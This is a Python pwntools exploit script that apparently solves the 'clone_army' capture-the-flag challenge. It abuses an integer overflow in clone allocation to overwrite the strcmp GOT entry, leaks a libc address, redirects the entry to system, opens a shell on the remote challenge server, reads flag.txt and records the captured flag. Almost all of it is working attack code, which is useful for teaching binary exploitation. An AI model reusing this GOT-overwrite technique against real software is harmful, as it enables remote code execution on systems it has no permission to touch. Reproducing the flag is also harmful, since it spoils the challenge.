#!/usr/bin/env python3

from pwn import *

exe = ELF('./clone_army_patched')
libc = ELF('./clone_army-libc.so')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
# realloc
b *0x40181A
# upd clone army
b *0x4017BE
'''

p = remote("chal.sunshinectf.games", 25001)
#p = process('./clone_army_patched')
#p = gdb.debug('./clone_army_patched', gdbscript = script)

# master copy
sla(b"> ", b"yes")
sla(b"> ", b"0")
sla(b"> ", b"0.000000000000000000000000000000000000000001")
sla(b"> ", b"0")

# padding clones
sla(b"> ", b"yes")
sla(b"> ", f"{0x403a90//0x10}".encode())

# more clones
sla(b"> ", b"yes")
sla(b"> ", f"{0x7fffffff - 0x403a90//0x10 + 1}".encode())

# done
'''
0x403a80 <master_copy>: 0x0000000000000000      0x0000000000000144
0x403a90 <clone_army>:  0x0000000000403a90      0x0000000000000144
0x403aa0 <line_buffer.0>:       0x3530323237343132      0x3030303000003736
0x403ab0 <line_buffer.0+16>:    0x3030303030303030      0x3030303030303030
0x403ac0 <line_buffer.0+32>:    0x3030303030303030      0x0000000031303030
0x403ad0 <line_buffer.0+48>:    0x0000000000000000      0x0000000000000000
0x403ae0 <line_buffer.0+64>:    0x0000000000000000      0x0000000000000000
0x403af0 <line_buffer.0+80>:    0x0000000000000000      0x0000000000000000
0x403b00 <line_buffer.0+96>:    0x0000000000000000      0x0000000000000000
'''

# edit clone_army -> strcmp got
sla(b"> ", b"no")
sla(b"> ", b"yes")
sla(b"> ", b"0")
sla(b"> ", b"1")
sla(b"> ", f"{0x4039e8}".encode())
sla(b"> ", b"yes")

# strcmp got -> system
sla(b"> ", b"yes")
sla(b"> ", b"0")
rcu(b"Which of soldier #") # leak
half_strcmp = int(rcu(b"'")[:-1:])
lleak("half_strcmp", half_strcmp)

# 
half_system = half_strcmp - 0x132850
sla(b"> ", b"1")
sla(b"> ", f"{half_system}".encode())
sla(b"> ", b"/bin/sh\x00")

sleep(1)
sl(b"cat flag.txt")

p.interactive()
#sun{t4k3_th1s_fl4g_my_l13g3}